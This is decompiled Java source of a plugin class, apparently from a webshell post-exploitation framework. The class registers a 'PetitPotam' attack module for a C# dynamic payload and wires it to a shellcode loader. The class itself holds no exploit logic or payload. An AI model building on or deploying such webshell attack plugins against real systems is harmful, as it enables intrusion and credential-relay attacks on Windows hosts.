//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.ShellcodeLoader;

@PluginAnnotation(
        payloadName = "CShapDynamicPayload",
        Name = "PetitPotam",
        DisplayName = "PetitPotam"
)
public class PetitPotam extends shells.plugins.generic.PetitPotam {
    public PetitPotam() {
    }

    protected ShellcodeLoader getShellcodeLoader() {
        return (ShellcodeLoader)super.shellEntity.getFrame().getPlugin("ShellcodeLoader");
    }
}
